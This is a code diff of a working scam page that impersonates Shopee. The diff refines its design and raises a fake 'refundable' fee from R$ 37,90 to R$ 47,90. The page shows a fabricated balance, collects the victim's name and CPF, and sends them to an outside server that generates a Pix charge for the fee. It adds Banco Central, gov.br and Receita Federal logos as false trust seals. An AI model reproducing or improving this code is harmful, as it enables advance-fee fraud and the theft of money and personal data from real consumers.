@@ -9,160 +9,177 @@
         * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
         body {
             font-family: 'Roboto', sans-serif;
-            background-color: #e5e5e5;
-            margin: 0; padding: 15px;
+            /* Gradiente de fundo sutil como na imagem oficial */
+            background: linear-gradient(180deg, #ee4d2d 0%, #f5f5f5 30%);
+            margin: 0; padding: 0;
             color: #333;
             min-height: 100vh;
         }
 
         /* --- UTILITÁRIOS --- */
         .hidden { display: none !important; }
+        .red-text { color: #ee4d2d; font-weight: 700; }
+        .green-badge { background: #e8f5e9; color: #2e7d32; padding: 2px 6px; border-radius: 4px; font-size: 10px; font-weight: bold; text-transform: uppercase; margin-left: 8px; }
         
         /* BOTÃO PADRÃO */
         .btn-main {
             background: #ee4d2d; color: white;
             width: 100%; padding: 15px;
-            border: none; border-radius: 4px;
-            font-size: 16px; font-weight: 500;
+            border: none; border-radius: 6px;
+            font-size: 16px; font-weight: 700;
             cursor: pointer; text-transform: uppercase;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+            box-shadow: 0 4px 6px rgba(238, 77, 45, 0.2);
         }
-        .btn-disabled { background: #f0f0f0; color: #ccc; cursor: not-allowed; box-shadow: none; }
+        .btn-disabled { background: #e0e0e0; color: #999; cursor: not-allowed; box-shadow: none; }
 
         /* --- TELA 1: SALDO --- */
-        .top-card {
-            background: #ee4d2d;
-            padding: 20px;
-            border-radius: 8px;
+        .header-section {
+            padding: 20px 20px 30px 20px;
             color: white;
-            margin-bottom: 15px;
-            position: relative;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
         }
-
-        /* Ícone Sacola Shopee (CSS Puro) */
-        .shopee-bag {
-            position: absolute; top: 20px; right: 20px;
-            width: 40px; height: 48px;
-            background: #f0c419;
-            border-radius: 4px;
-            display: flex; align-items: center; justify-content: center;
-        }
-        .shopee-bag::before {
-            content: ''; position: absolute; top: -10px; left: 10px;
-            width: 20px; height: 20px;
-            border: 4px solid #f0c419;
-            border-bottom: none; border-radius: 20px 20px 0 0;
-        }
-        .shopee-bag::after {
-            content: 'S'; color: #ee4d2d; font-weight: 900; font-size: 28px; font-family: sans-serif;
-        }
-
-        .header-top { font-size: 14px; margin-bottom: 5px; opacity: 0.95; }
-        .saldo-valor { font-size: 38px; font-weight: 800; margin-bottom: 5px; }
-        .pontos-text { font-size: 12px; opacity: 0.9; margin-bottom: 15px; }
+        .header-top { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 10px; }
         
-        .divider { border-top: 1px dashed rgba(255,255,255,0.4); margin: 15px 0; }
-        .bonus-text { font-size: 12px; font-weight: 500; }
-
-        /* CARDS BRANCOS */
+        /* Ícone da Moeda (Novo) */
+        .coin-icon {
+            width: 42px; height: 42px;
+            display: flex; align-items: center; justify-content: center;
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));
+        }
+        .coin-icon svg { width: 100%; height: 100%; }
+        
         .card-white {
             background: white;
+            margin: 0 15px 15px 15px;
             padding: 20px;
             border-radius: 8px;
-            margin-bottom: 15px;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
         }
-        .card-title { font-size: 16px; font-weight: 700; color: #000; margin-bottom: 15px; }
+
+        /* Lista de Benefícios (Novo) */
+        .benefits-list { list-style: none; padding: 0; margin: 0; }
+        .benefits-list li {
+            display: flex; align-items: center; gap: 10px;
+            font-size: 13px; color: #555; margin-bottom: 12px;
+        }
+        .check-icon {
+            color: #ee4d2d; font-weight: bold; font-size: 14px;
+            background: #fff5f5; width: 20px; height: 20px;
+            display: flex; align-items: center; justify-content: center;
+            border-radius: 50%; flex-shrink: 0;
+        }
 
         /* Opções de Valor */
-        .transfer-row { display: flex; align-items: center; font-size: 14px; color: #777; margin-bottom: 15px; }
-        .pix-tag { 
-            color: #32aba3;
-            font-weight: 700; font-size: 16px; margin-left: 5px; 
-            font-family: sans-serif;
-        }
-
         .option-group { display: flex; gap: 10px; margin-bottom: 10px; }
         .option-btn {
-            background: #f5f5f5; border: 1px solid #f5f5f5;
-            padding: 12px 0; border-radius: 4px;
-            text-align: center; font-weight: 700; font-size: 14px;
-            flex: 1; color: #333; cursor: pointer;
+            border: 1px solid #f0f0f0; background: #f9f9f9;
+            padding: 12px 0; border-radius: 6px;
+            text-align: center; font-weight: 600; font-size: 14px;
+            flex: 1; color: #333; transition: all 0.2s;
         }
         .big-option {
             width: 100%; padding: 20px 0;
             font-size: 24px; font-weight: 800;
             margin: 10px 0 20px 0;
-            background: #f5f5f5; border: 1px solid #f5f5f5; border-radius: 4px;
-            text-align: center; cursor: pointer;
+            border: 1px solid #f0f0f0; border-radius: 8px;
+            text-align: center; background: #f9f9f9; transition: all 0.2s;
         }
-        .selected { border: 1px solid #ee4d2d !important; background: #fff !important; color: #ee4d2d !important; }
+        /* Selecionado */
+        .selected { border: 1px solid #ee4d2d !important; background: #fff !important; color: #ee4d2d !important; position: relative; }
+        .selected::after {
+            content: '✔'; position: absolute; top: -6px; right: -6px;
+            background: #ee4d2d; color: white; width: 18px; height: 18px;
+            border-radius: 50%; font-size: 11px; display: flex; justify-content: center; align-items: center; border: 2px solid #fff;
+        }
 
-        /* Footer */
-        .footer-content { display: flex; gap: 15px; align-items: flex-start; }
-        .footer-text { font-size: 11px; color: #666; line-height: 1.4; text-align: justify; }
-        .footer-bag { width: 40px; opacity: 0.9; }
+        /* Selos de Segurança (Novo) */
+        .security-seals-container {
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            padding-top: 10px;
+            filter: grayscale(100%); opacity: 0.7;
+        }
+        .security-seal {
+            height: 30px;
+            width: auto;
+        }
 
         /* --- TELA 2: MODAL VINCULAR --- */
         .modal-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.5); z-index: 99;
+            background: rgba(0,0,0,0.6); z-index: 99;
             display: flex; align-items: flex-end; justify-content: center;
         }
         .modal-sheet {
             background: white; width: 100%; max-width: 500px;
-            border-radius: 16px 16px 0 0; padding: 25px;
+            border-radius: 16px 16px 0 0; padding: 30px 25px;
             animation: slideUp 0.3s ease-out;
         }
         @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
 
-        .input-group { margin-bottom: 15px; }
-        .input-label { font-size: 13px; font-weight: 700; color: #333; margin-bottom: 8px; display: block; }
+        .input-group { margin-bottom: 20px; }
+        .input-label { font-size: 14px; font-weight: 700; color: #333; margin-bottom: 8px; display: block; }
         .input-field {
-            width: 100%; padding: 14px;
-            border: 1px solid #ddd; border-radius: 6px;
-            font-size: 15px; background: #fff;
+            width: 100%; padding: 16px;
+            border: 1px solid #e0e0e0; border-radius: 8px;
+            font-size: 16px; background: #f9f9f9; color: #333;
         }
+        .input-field:focus { border-color: #ee4d2d; background: #fff; }
 
         /* --- TELA 3: CONFIRMAÇÃO --- */
         .shopee-top-bar { background: #ee4d2d; padding: 15px 0; display: flex; justify-content: center; }
-        .summary-header { background: white; text-align: center; padding: 20px; border-bottom: 8px solid #f0f0f0; }
-        .info-card { background: white; margin: 15px; border-radius: 8px; padding: 20px; border: 1px solid #eee; }
-        .info-title { font-size: 12px; font-weight: 700; color: #666; text-transform: uppercase; margin-bottom: 10px; }
-        .data-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #f5f5f5; font-size: 13px; }
+        .summary-header { background: white; text-align: center; padding: 25px 20px; border-bottom: 10px solid #f5f5f5; }
+        .info-card { background: white; margin: 15px; border-radius: 8px; padding: 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
+        .info-title { font-size: 13px; font-weight: 700; color: #555; text-transform: uppercase; margin-bottom: 15px; letter-spacing: 0.5px; }
+        .data-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #f0f0f0; font-size: 14px; }
         .data-row:last-child { border-bottom: none; }
+        .data-label { color: #777; }
+        .data-value { font-weight: 600; text-align: right; color: #333; }
         
-        .process-item { display: flex; gap: 12px; margin-bottom: 15px; }
-        .p-icon { width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 12px; flex-shrink: 0; }
+        .process-item { display: flex; gap: 15px; margin-bottom: 20px; }
+        .p-icon { width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 13px; flex-shrink: 0; }
         .p-num { background: #fdeee9; color: #ee4d2d; }
         .p-check { background: #e8f5e9; color: #2e7d32; }
+        .p-content h4 { margin: 0 0 5px 0; font-size: 15px; font-weight: 600; color: #333; }
+        .p-content p { margin: 0; font-size: 13px; color: #777; }
         
-        .footer-logos { display: flex; justify-content: center; gap: 20px; align-items: center; margin: 30px 0 50px 0; filter: grayscale(100%); opacity: 0.6; }
-        .logo-img { height: 20px; width: auto; }
+        .footer-logos { display: flex; justify-content: center; gap: 25px; align-items: center; margin: 40px 0 50px 0; filter: grayscale(100%); opacity: 0.5; }
+        .logo-img { height: 22px; width: auto; }
 
-        /* QR Modal */
-        #qr-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 200; align-items: center; justify-content: center; }
-        .qr-box { background: white; width: 90%; max-width: 320px; border-radius: 8px; padding: 25px; text-align: center; }
-        .pix-code-area { background: #f5f5f5; border: 1px dashed #ccc; padding: 10px; font-size: 11px; word-break: break-all; margin: 15px 0; color: #555; border-radius: 4px; }
+        /* Popup QR Code */
+        #qr-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 200; align-items: center; justify-content: center; }
+        .qr-box { background: white; width: 90%; max-width: 340px; border-radius: 12px; padding: 30px 25px; text-align: center; }
+        .pix-code-area { background: #f0f0f0; border: 1px solid #ddd; padding: 12px; font-size: 12px; word-break: break-all; margin: 20px 0; color: #555; border-radius: 6px; }
     </style>
 </head>
 <body>
 
     <div id="step-1">
-        <div class="top-card">
-            <div class="shopee-bag"></div>
-            <div class="header-top">Seu saldo</div>
-            <div class="saldo-valor">R$ 1.489,38</div>
-            <div class="pontos-text">= 42.583,05 pontos (s)</div>
-            <div class="divider"></div>
-            <div class="bonus-text">Última bonificação apresentada : R$ 845,24</div>
+        <div class="header-section">
+            <div class="header-top">
+                <span style="font-size: 15px; font-weight: 500; opacity: 0.9;">Seu saldo</span>
+                <div class="coin-icon">
+                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="12" cy="12" r="10" fill="url(#paint0_linear)" stroke="#F59E0B" stroke-width="1.5"/>
+                        <path d="M12 6V18M8 12H16" stroke="#FDE68A" stroke-width="2.5" stroke-linecap="round"/>
+                        <defs>
+                            <linearGradient id="paint0_linear" x1="12" y1="2" x2="12" y2="22" gradientUnits="userSpaceOnUse">
+                                <stop stop-color="#FCD34D"/>
+                                <stop offset="1" stop-color="#F59E0B"/>
+                            </linearGradient>
+                        </defs>
+                    </svg>
+                </div>
+            </div>
+            <div style="font-size: 42px; font-weight: 800;">R$ <span id="balance-value">0,00</span></div>
+            <div style="font-size: 13px; opacity: 0.8; margin-top: 5px;">= <span id="points-value">0,00</span> pontos (s)</div>
         </div>
 
-        <div class="card-white">
-            <div class="card-title">Sacar dinheiro</div>
-            <div class="transfer-row">
-                <span style="font-size: 18px; margin-right: 5px;">💳</span> Transferência via <span class="pix-tag">Pix</span>
+        <div class="card-white" style="margin-top: -20px; position: relative; z-index: 10;">
+            <h3 style="margin-top:0; font-size: 17px; margin-bottom: 20px; color: #222;">Sacar dinheiro</h3>
+            
+            <div style="display:flex; align-items:center; gap:8px; margin-bottom:20px; font-size:14px; color:#666;">
+                <span style="font-size: 18px;">💳</span> Transferencia via <strong style="color:#333;">Pix</strong>
             </div>
 
             <div class="option-group">
@@ -178,113 +195,194 @@
             <button id="btn-sacar-1" class="btn-main btn-disabled" onclick="openStep2()">
                 SACAR DINHEIRO
             </button>
-            <p style="font-size:11px; color:#999; text-align:center; margin-top:15px;">
-                Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5.
+
+            <p style="font-size:12px; color:#999; text-align:center; margin-top:15px; line-height:1.5;">
+                Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5. Os limites de saque podem variar conforme a região.
             </p>
         </div>
 
         <div class="card-white">
-            <div class="card-title" style="margin-bottom: 10px;">Obtenha seu acesso exclusivo</div>
-            <div class="footer-content">
-                <div class="footer-text">
-                    Descubra todos os benefícios liberados especialmente para você. Ao concluir o acesso, você poderá aproveitar as vantagens disponíveis.
-                </div>
-                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" class="footer-bag">
+            <h4 style="margin:0 0 15px 0; font-size:15px; color:#333;">Obtenha seu acesso exclusivo</h4>
+            
+            <ul class="benefits-list">
+                <li><span class="check-icon">✓</span> Saques instantâneos acima de R$ 1,50</li>
+                <li><span class="check-icon">✓</span> Bônus diários por atividade</li>
+                <li><span class="check-icon">✓</span> Suporte prioritário 24/7</li>
+            </ul>
+
+            <div class="security-seals-container">
+                <img src="https://logodownload.org/wp-content/uploads/2017/08/bacen-logo.png" alt="BACEN" class="security-seal">
+                <img src="https://www.gov.br/++theme++br.gov.tema/images/logo-govbr.png" alt="gov.br" class="security-seal">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/46/Receita_Federal_do_Brasil_-_2022_logo.svg/1024px-Receita_Federal_do_Brasil_-_2022_logo.svg.png" alt="Receita Federal" class="security-seal" style="height: 25px;">
             </div>
         </div>
     </div>
+
 
     <div id="step-2" class="modal-overlay hidden">
         <div class="modal-sheet">
-            <h2 style="text-align:center; font-size:18px; margin-bottom:25px; color:#000;">Vincular PIX</h2>
+            <h2 style="text-align:center; font-size:18px; margin-bottom:30px; color:#333;">Vincular PIX</h2>
+            
             <div class="input-group">
                 <label class="input-label">Nome Completo</label>
-                <input type="text" id="input-nome" class="input-field" placeholder="Nome do titular">
+                <input type="text" id="input-nome" class="input-field" placeholder="Nome do titular da conta">
             </div>
+
             <div class="input-group">
                 <label class="input-label">Tipo de Chave PIX</label>
-                <select class="input-field" style="background:white;"><option>CPF</option></select>
+                <select class="input-field" style="background-color: white; appearance: none;">
+                    <option>CPF</option>
+                </select>
             </div>
+
             <div class="input-group">
-                <label class="input-label">Chave PIX</label>
-                <input type="tel" id="input-cpf" class="input-field" placeholder="Digite sua chave" maxlength="14" oninput="mask(this)">
+                <label class="input-label">Chave PIX (CPF)</label>
+                <input type="tel" id="input-cpf" class="input-field" placeholder="Digite apenas números" maxlength="14" oninput="mask(this)">
             </div>
-            <button class="btn-main" onclick="openStep3()">CONTINUAR</button>
-            <p style="text-align:center; font-size:11px; color:#ccc; margin-top:20px;">Ambiente seguro Shopee Pay</p>
+
+            <button class="btn-main" onclick="openStep3()" style="padding: 18px;">CONTINUAR</button>
+            
+            <p style="text-align:center; font-size:12px; color:#bbb; margin-top:25px; display:flex; align-items:center; justify-content:center; gap:5px;">
+                🔒 Ambiente seguro Shopee Pay
+            </p>
         </div>
     </div>
 
+
     <div id="step-3" class="hidden" style="background: #f5f5f5; min-height: 100vh;">
         <div class="shopee-top-bar">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" height="28" style="filter: brightness(0) invert(1);">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" height="30" style="filter: brightness(0) invert(1);">
         </div>
 
         <div class="summary-header">
-            <div style="font-size:12px; font-weight:700; color:#333; text-transform:uppercase;">SALDO DISPONÍVEL</div>
-            <div style="font-size:32px; font-weight:800; color:#000; margin: 5px 0;">R$ 1.489,38</div>
-            <div style="font-size:12px; color:#888;">Aguardando confirmação para saque</div>
+            <div style="font-size:13px; font-weight:700; color:#333; text-transform:uppercase; margin-bottom:5px;">SALDO DISPONÍVEL</div>
+            <div style="font-size:36px; font-weight:900; color:#000;">R$ 1.489,38</div>
+            <div style="font-size:13px; color:#777; margin-top: 5px;">Aguardando confirmação para saque</div>
         </div>
 
         <div class="info-card">
             <div class="info-title">CONFIRMAÇÃO DE IDENTIDADE</div>
-            <div style="display:flex; align-items:center; margin-bottom:10px; gap: 8px;">
-                <span style="font-size:22px; font-weight:800; color:#ee4d2d;">R$ 37,90</span>
-                <span style="background:#e8f5e9; color:#2e7d32; padding:2px 5px; border-radius:3px; font-size:10px; font-weight:700;">VALOR REEMBOLSÁVEL</span>
+            <div style="display:flex; align-items:center; margin-bottom:12px;">
+                <span style="font-size:24px; font-weight:800; color:#ee4d2d;">R$ 47,90</span>
+                <span class="green-badge">VALOR REEMBOLSÁVEL</span>
             </div>
-            <p style="font-size:13px; color:#555; line-height:1.4;">
-                Taxa obrigatória para liberação do bônus. O valor de <strong>R$ 37,90</strong> será reembolsado integralmente para você em 1 minuto.
+            <p style="font-size:14px; color:#555; line-height:1.5; margin:0;">
+                Taxa obrigatória para liberação do bônus. O valor de <strong>R$ 47,90</strong> será reembolsado integralmente para você em 1 minuto após a validação.
             </p>
         </div>
 
         <div class="info-card">
             <div class="info-title">DADOS PARA REEMBOLSO</div>
-            <div class="data-row"><span style="color:#888;">Nome</span><span id="display-nome" style="font-weight:600;">...</span></div>
-            <div class="data-row"><span style="color:#888;">Data</span><span id="display-data" style="font-weight:600;">...</span></div>
-            <div class="data-row"><span style="color:#888;">Chave PIX</span><span id="display-cpf" style="font-weight:600;">...</span></div>
-            <div class="data-row"><span style="color:#888;">Valor a receber</span><span style="font-weight:700;">R$ 1.489,38</span></div>
+            <div class="data-row">
+                <span class="data-label">Nome</span>
+                <span class="data-value" id="display-nome">...</span>
+            </div>
+            <div class="data-row">
+                <span class="data-label">Data</span>
+                <span class="data-value" id="display-data">...</span>
+            </div>
+            <div class="data-row">
+                <span class="data-label">Chave PIX</span>
+                <span class="data-value" id="display-cpf">...</span>
+            </div>
+            <div class="data-row">
+                <span class="data-label">Valor a receber</span>
+                <span class="data-value" style="color:#ee4d2d;">R$ 1.489,38</span>
+            </div>
         </div>
 
         <div class="info-card">
-            <div class="info-title" style="margin-bottom:15px;">PROCESSO DE LIBERAÇÃO</div>
+            <div class="info-title" style="margin-bottom: 20px;">PROCESSO DE LIBERAÇÃO</div>
             <div class="process-item">
                 <div class="p-icon p-num">1</div>
-                <div><div style="font-weight:600; font-size:14px;">Pagar taxa de confirmação</div><div style="font-size:12px; color:#888;">Verificação de identidade</div></div>
+                <div class="p-content">
+                    <h4>Pagar taxa de confirmação</h4>
+                    <p>Para verificação de identidade</p>
+                </div>
             </div>
             <div class="process-item">
                 <div class="p-icon p-check">✓</div>
-                <div><div style="font-weight:600; font-size:14px; color:#2e7d32;">Reembolso automático</div><div style="font-size:12px; color:#888;">Devolvido em 1 minuto</div></div>
+                <div class="p-content">
+                    <h4 style="color:#2e7d32;">Receber reembolso automático</h4>
+                    <p>Valor devolvido em 1 minuto</p>
+                </div>
             </div>
             <div class="process-item">
                 <div class="p-icon" style="background:#eee; color:#aaa;">3</div>
-                <div><div style="font-weight:600; font-size:14px;">Acessar saldo completo</div><div style="font-size:12px; color:#888;">R$ 1.489,38 liberado</div></div>
+                <div class="p-content">
+                    <h4>Acessar saldo completo</h4>
+                    <p>R$ 1.489,38 liberado para saque</p>
+                </div>
             </div>
         </div>
 
-        <div style="padding: 10px 15px;">
-            <button id="btn-final" class="btn-main" onclick="gerarPix()">Pagar taxa para Liberar Saque</button>
-            <div style="text-align:center; font-size:12px; color:#2e7d32; font-weight:600; margin-top:10px;">⏱ Reembolso automático em 1 minuto</div>
+        <div style="padding: 15px 20px;">
+            <button id="btn-final" class="btn-main" style="padding: 18px;" onclick="gerarPix()">
+                Pagar taxa para Liberar Saque
+            </button>
+            <div style="text-align:center; font-size:13px; color:#2e7d32; font-weight:600; margin-top:15px; display:flex; align-items:center; justify-content:center; gap:5px;">
+                ⏱ Reembolso automático garantido em 1 minuto
+            </div>
         </div>
 
         <div class="footer-logos">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5a/Banco_Central_do_Brasil_logo.svg/2560px-Banco_Central_do_Brasil_logo.svg.png" class="logo-img">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Gov.br_logo.svg" class="logo-img">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Gov.br_logo.svg" class="logo-img" style="height: 25px;">
             <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Receita_Federal_do_Brasil_-_2022_logo.svg" class="logo-img">
         </div>
     </div>
 
+
     <div id="qr-modal">
         <div class="qr-box">
-            <h3 style="margin-top:0;">Pagamento Pix</h3>
-            <p style="font-size:13px; color:#666;">Copie o código e pague no app do banco.</p>
-            <img id="img-qr" style="width:160px; height:160px; display:block; margin:10px auto; border:1px solid #eee;">
-            <div style="text-align:left; font-size:11px; font-weight:bold;">Pix Copia e Cola:</div>
+            <h3 style="margin-top:0; color:#333; font-size: 18px;">Pagamento via Pix</h3>
+            <p style="font-size:14px; color:#666; margin-bottom: 20px;">Copie o código abaixo e pague no aplicativo do seu banco para finalizar.</p>
+            
+            <img id="img-qr" style="width:180px; height:180px; display:block; margin:0 auto; border:1px solid #eee; padding: 10px; border-radius: 8px;">
+            
+            <div style="text-align:left; font-size:12px; font-weight:700; margin-bottom:8px; margin-top: 20px; color: #333;">Pix Copia e Cola:</div>
             <textarea id="texto-pix" class="pix-code-area" readonly></textarea>
-            <button class="btn-main" onclick="copiarCodigo()" style="padding:10px;">COPIAR CÓDIGO</button>
-            <div id="msg-sucesso" style="margin-top:15px; display:none; color:#2e7d32; font-weight:bold;">PAGAMENTO CONFIRMADO!</div>
+            
+            <button class="btn-main" onclick="copiarCodigo()" style="padding:15px;">COPIAR CÓDIGO PIX</button>
+            
+            <div id="msg-sucesso" style="margin-top:20px; display:none; color:#2e7d32; font-weight:bold; font-size: 14px;">
+                ✅ PAGAMENTO CONFIRMADO!
+            </div>
         </div>
     </div>
 
     <script>
+        // --- FUNÇÃO DE ANIMAÇÃO DOS NÚMEROS ---
+        function animateValue(id, start, end, duration) {
+            const obj = document.getElementById(id);
+            let startTimestamp = null;
+            const step = (timestamp) => {
+                if (!startTimestamp) startTimestamp = timestamp;
+                const progress = Math.min((timestamp - startTimestamp) / duration, 1);
+                let value = progress * (end - start) + start;
+                
+                // Formatação para moeda ou pontos
+                if (id === 'balance-value') {
+                    obj.innerHTML = value.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+                } else {
+                    obj.innerHTML = value.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+                }
+
+                if (progress < 1) {
+                    window.requestAnimationFrame(step);
+                }
+            };
+            window.requestAnimationFrame(step);
+        }
+
+        // Iniciar animação quando a página carregar
+        document.addEventListener("DOMContentLoaded", () => {
+            animateValue("balance-value", 0, 1489.38, 1500); // 1.5 segundos para o saldo
+            animateValue("points-value", 0, 42583.05, 1500); // 1.5 segundos para os pontos
+        });
+
+
+        // --- LÓGICA DO SISTEMA ---
         const API_URL = "https://checkout-pix-profissional.onrender.com";
         let valorSelecionado = false;
 
@@ -311,23 +409,24 @@
         }
 
         function openStep2() {
-            if(!valorSelecionado) return alert("Selecione um valor.");
+            if(!valorSelecionado) return alert("Selecione um valor para sacar.");
             document.getElementById('step-2').classList.remove('hidden');
         }
 
         function openStep3() {
             const nome = document.getElementById('input-nome').value;
             const cpf = document.getElementById('input-cpf').value;
-            if(nome.length < 3 || cpf.length < 14) return alert("Preencha os dados.");
+            if(nome.length < 3 || cpf.length < 14) return alert("Por favor, preencha seu Nome e CPF corretamente.");
 
             document.getElementById('display-nome').innerText = nome;
             document.getElementById('display-cpf').innerText = cpf;
-            document.getElementById('display-data').innerText = new Date().toLocaleDateString('pt-BR');
+            const hoje = new Date();
+            document.getElementById('display-data').innerText = hoje.toLocaleDateString('pt-BR');
 
             document.getElementById('step-2').classList.add('hidden');
             document.getElementById('step-1').classList.add('hidden');
             document.getElementById('step-3').classList.remove('hidden');
-            window.scrollTo(0,0);
+            window.scrollTo(0, 0);
         }
 
         async function gerarPix() {
@@ -335,26 +434,28 @@
             const nome = document.getElementById('input-nome').value;
             const cpf = document.getElementById('input-cpf').value.replace(/\D/g,'');
 
-            btn.innerText = "GERANDO...";
+            btn.innerText = "GERANDO PAGAMENTO...";
             btn.classList.add('btn-disabled');
 
             try {
-                // VALOR CORRIGIDO AQUI PARA 37.90
                 const response = await fetch(`${API_URL}/pix`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ amount: 37.90, name: nome, cpf: cpf })
+                    body: JSON.stringify({ amount: 47.90, name: nome, cpf: cpf })
                 });
                 const data = await response.json();
 
                 if (data.point_of_interaction) {
                     document.getElementById('img-qr').src = `data:image/png;base64,${data.point_of_interaction.transaction_data.qr_code_base64}`;
                     document.getElementById('texto-pix').value = data.point_of_interaction.transaction_data.qr_code;
+                    
                     document.getElementById('qr-modal').style.display = 'flex';
                     monitor(data.id);
-                } else { throw new Error(); }
+                } else {
+                    throw new Error("Erro na resposta do servidor");
+                }
             } catch (error) {
-                alert("Erro ao criar Pix.");
+                alert("Erro ao gerar Pix. Verifique sua conexão e tente novamente.");
                 btn.classList.remove('btn-disabled');
                 btn.innerText = "Pagar taxa para Liberar Saque";
             }
@@ -377,9 +478,9 @@
         function copiarCodigo() {
             const texto = document.getElementById('texto-pix');
             texto.select();
-            texto.setSelectionRange(0, 99999);
+            texto.setSelectionRange(0, 99999); /* Para mobile */
             document.execCommand('copy');
-            alert("Código copiado!");
+            alert("Código Pix copiado com sucesso!");
         }
     </script>
 </body>
